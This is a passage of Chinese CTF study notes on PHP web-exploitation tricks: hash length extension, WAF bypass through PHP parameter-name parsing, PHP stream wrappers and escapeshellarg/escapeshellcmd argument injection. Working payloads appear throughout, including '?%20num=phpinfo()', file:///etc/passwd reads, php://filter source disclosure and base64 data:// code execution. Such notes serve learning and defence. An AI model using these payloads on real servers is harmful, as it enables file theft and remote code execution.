+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="哈希长度拓展攻击">哈希长度拓展攻击
+&lt;/h3>&lt;ul>
+&lt;li>工具目录：&lt;code>/Users/jz/Code/CTF/tools/attack-scripts/logic&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>使用工具，攻击者能够根据&lt;strong>已知哈希值&lt;/strong>、&lt;strong>原始消息长度&lt;/strong>、结尾需要附加的&lt;strong>新数据&lt;/strong>，计算出原始消息需要附加的&lt;strong>完整附加数据&lt;/strong>以及&lt;strong>整个消息的新哈希值&lt;/strong>。&lt;/p>
+&lt;ul>
+&lt;li>原理：利用填充函数将消息扩展为压缩函数能处理的&lt;strong>固定长度的倍数&lt;/strong>&lt;/li>
+&lt;li>所以不能仅仅附加需要的数据，只能做到以所要求的数据结尾&lt;/li>
+&lt;li>==原始消息需要附加的完整附加数据 是 包含结尾需要附加的新数据的&lt;strong>更长的字符串==&lt;/strong>&lt;/li>
+&lt;li>在原始消息的基础上，不是仅仅附加了需要附加的新数据，是附加了一串&lt;strong>更长的数据&lt;/strong>，需要附加的完整新数据最终可以做到以所要求的新数据结尾，所以整个完整的消息也是以所要求的新数据结尾&lt;/li>
+&lt;/ul>
+&lt;h4 id="判断-php-生成字符串长度">判断 php 生成字符串长度
+&lt;/h4>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$str&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">bin2hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">random_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">bin2hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">random_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">bin2hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">random_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>randomb_bytes 生成 16 字节&lt;/li>
+&lt;li>bin2hex 对每个字节生成两个16进制字符 得到32个字符&lt;/li>
+&lt;li>三个拼接得到96个字符&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="php字符串解析特性">php字符串解析特性
+&lt;/h2>&lt;ol>
+&lt;li>removes initial whitespace&lt;/li>
+&lt;li>converts some characters to underscore (including whitespace)&lt;/li>
+&lt;/ol>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>USER INPUT&lt;/th>
+&lt;th>DECODED&lt;/th>
+&lt;th>PHP VARIABLE NAME&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>%20foo_bar%00&lt;/td>
+&lt;td>foo_bar&lt;/td>
+&lt;td>foo_bar&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>foo%20bar%00&lt;/td>
+&lt;td>foo bar&lt;/td>
+&lt;td>foo_bar&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>foo%5bbar&lt;/td>
+&lt;td>foo[bar&lt;/td>
+&lt;td>foo_bar&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h3 id="绕过waf">绕过WAF
+&lt;/h3>&lt;p>可以在用户输入时，利用字符串解析特性输入变形后的变量，导致php语法中可以正常检测到（传入的get/post）变量，同时，WAF等检测规则（waf等不具有php字符串解析特性）无法识别到相应黑名单/block规则中的变量，形成bypass&lt;/p>
+&lt;h4 id="实例-1">实例
+&lt;/h4>&lt;p>对于一个存在检测是否是数字的WAF，传入变量为num，可以构造payload：&lt;code>?%20num=phpinfo()&lt;/code>&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>%20num&lt;/code> 在php语法中，被解析成&lt;code>num&lt;/code>变量，进入后续的eval木马中执行相应的注入代码&lt;/li>
+&lt;li>&lt;code>%20num&lt;/code> 在WAF检测中，无法被解析成num，故对num的检测没有执行，发生bypass&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="publicprotectedprivate的区别">public、protected、private的区别
+&lt;/h2>&lt;p>public 表示全局，类内部外部子类都可以访问；&lt;br>
+**private表示私有的，只有本类内部可以使用； **
+protected表示受保护的，只有本类或子类或父类中可以访问&lt;/p>
+&lt;hr>
+&lt;h2 id="魔术方法">魔术方法
+&lt;/h2>&lt;p>PHP中把以两个下划线 &lt;code>__&lt;/code> 开头的方法称为魔术方法(Magic methods)&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">__construct&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="err">当一个对象创建时被调用，反序列化不触发&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__destruct&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="err">当一个对象销毁时被调用&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__toString&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="err">当一个对象被当作一个字符串使用，比如&lt;/span>&lt;span class="n">echo输出或用&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="err">和字符串拼接&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__call&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="err">当调用的方法不存在时触发&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__invoke&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="err">当一个对象被当作函数调用时触发&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__wakeup&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="err">反序列化时自动调用&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__get&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="err">类中的属性私有或不存在触发&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__set&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="err">类中的属性私有或不存在触发&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="非法参数名传参">非法参数名传参
+&lt;/h2>&lt;ul>
+&lt;li>&lt;a class="link" href="https://blog.csdn.net/mochu7777777/article/details/115050295" target="_blank" rel="noopener"
+>谈一谈PHP中关于非法参数名传参问题_arr4y非法传参-CSDN博客&lt;/a>&lt;/li>
+&lt;li>注意：只发送在PHP版本小于8时，当PHP版本大于等于8并不会出现以下介绍的转换错误&lt;/li>
+&lt;/ul>
+&lt;p>当变量名中出现 &lt;code>.&lt;/code> 和 &lt;code>空格&lt;/code> 时，PHP 会把它们转换成下划线&lt;/p>
+&lt;p>但是，如果参数中出现中括号&lt;code>[&lt;/code>，中括号会被转换成下划线&lt;code>_&lt;/code>，接下来如果该参数名中还有&lt;code>非法字符&lt;/code> 并不会继续转换成下划线&lt;code>_&lt;/code>，忽略后面所有错误。&lt;/p>
+&lt;h4 id="实例-2">实例
+&lt;/h4>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$zj&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;z j.&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 传入参数 $zj 实际变量
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ?z j.=1 NULL z_j_
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ?z[j.=1 NULL z_j.
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>当传入 &lt;code>?z j.=1&lt;/code> 时，虽然 $zj 变量仍然是空的，但是存在 &lt;code> $_REQUEST['z_j_']&lt;/code>&lt;/li>
+&lt;li>&lt;code>$_GET&lt;/code> 会自动对参数调用 urldecode，所以得到的参数键值对的数组中的值都是字符串。&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="php-伪协议">php 伪协议
+&lt;/h2>&lt;p>伪协议是&lt;strong>一种特殊的协议，用于访问不同的数据源&lt;/strong>。&lt;/p>
+&lt;p>它们并不是真正的网络协议，而是一种封装协议，使得PHP能够以特定的方式&lt;strong>访问和操作数据&lt;/strong>。 PHP提供了多种伪协议，每种伪协议都有其特定的用途和功能。&lt;/p>
+&lt;h3 id="file">file://
+&lt;/h3>&lt;p>一般用于访问本地文件&lt;/p>
+&lt;ul>
+&lt;li>绝对路径、相对路径、网络路径&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">?file&lt;span class="o">=&lt;/span>file:///etc/passswd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">?url&lt;span class="o">=&lt;/span>/?url&lt;span class="o">=&lt;/span>file:///var/www/html/index.php &lt;span class="c1"># 访问index.php&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="php">php://
+&lt;/h3>&lt;p>访问各个输入输出流&lt;/p>
+&lt;p>常用： &lt;code>php://filter&lt;/code> 用于&lt;strong>读取源码&lt;/strong>，&lt;code>php://input&lt;/code> 用于&lt;strong>执行php代码&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># base64 输出&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">php://filter/read&lt;span class="o">=&lt;/span>convert.base64-encode/resource&lt;span class="o">=[&lt;/span>文件名&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 适用于 include 读文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 在数据流中写入 POST 的数据&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">php://input
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 读取实例&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">?cmd&lt;span class="o">=&lt;/span>php://filter/read&lt;span class="o">=&lt;/span>convert.base64-encode/resource&lt;span class="o">=[&lt;/span>文件名&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="data">data://
+&lt;/h3>&lt;p>数据流封装器，以&lt;strong>传递相应格式的数据&lt;/strong>。可以用来执行PHP代码。一般需要用到&lt;code>base64编码&lt;/code>传输。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">?file=data://text/plain,xxxx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="实例-3">实例
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">file_get_contents&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$text&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;r&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="s2">&amp;#34;welcome to the zjctf&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>要求从文件里读取字符串，与 welcome to the zjctf 相等&lt;/li>
+&lt;/ul>
+&lt;p>可以用 &lt;code>data://&lt;/code> 和 &lt;code>php://&lt;/code> 协议，将数据流重定向到用户可以控制的输入流&lt;/p>
+&lt;p>构造 payload:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">?text&lt;span class="o">=&lt;/span>data://text/plain,welcome to the zjctf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 相当于 封装了一个虚拟的文件 内容是 welcome to the zjctf&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 或者&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">?text&lt;span class="o">=&lt;/span>php://input
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 同时 POST数据：welcome to the zjctf&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="escapeshellarg-和-escapeshellcmd">escapeshellarg 和 escapeshellcmd
+&lt;/h2>&lt;h3 id="escapeshellarg">escapeshellarg
+&lt;/h3>&lt;ul>
+&lt;li>&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html#0x02-escapeshellarg" target="_blank" rel="noopener"
+>0x02 escapeshellarg为什么没有奏效？&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="http://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener"
+>浅谈escapeshellarg逃逸与参数注入 \[ Mi1k7ea \]&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>escapeshellarg 会给没有单引号的字符串加上单引号；对于有单引号的字符串，会先对单引号转义，再以单引号为分割，对各部分的字符串加上单引号。&lt;/p>
+&lt;p>测试功能：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$str1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;ls&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$str2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;ls -al&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$str3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;ls&amp;#39;zj&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">escapeshellarg&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$str1&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">escapeshellarg&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$str2&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">escapeshellarg&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$str3&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>结果：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">string(4) &amp;#34;&amp;#39;ls&amp;#39;&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">string(8) &amp;#34;&amp;#39;ls -al&amp;#39;&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">string(10) &amp;#34;&amp;#39;ls&amp;#39;\&amp;#39;&amp;#39;zj&amp;#39;&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="escapeshellcmd">escapeshellcmd
+&lt;/h3>&lt;p>反斜线&lt;code>\&lt;/code> 会在以下字符之前插入：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> &amp;amp;#;`|*?~&amp;lt;&amp;gt;^()[]{}$\ \x0A \xFF
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>不成对的引号也会被转义&lt;/li>
+&lt;li>在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替&lt;/li>
+&lt;/ul>
+&lt;p>测试：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$str1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;ls&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$str2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;ls;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$str3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#39;;ls;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">escapeshellcmd&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$str1&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">escapeshellcmd&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$str2&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">escapeshellcmd&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$str3&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>结果：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">string(2) &amp;#34;ls&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">string(4) &amp;#34;ls\;&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">string(8) &amp;#34;\&amp;#39;\;ls\;&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="对于-arg--cmd-的参数注入">对于 arg + cmd 的参数注入
+&lt;/h3>&lt;p>测试：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$str1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;zj&amp;#39; -l &amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">escapeshellcmd&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ls --ignore=&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">escapeshellarg&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$str1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34; /tmp&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
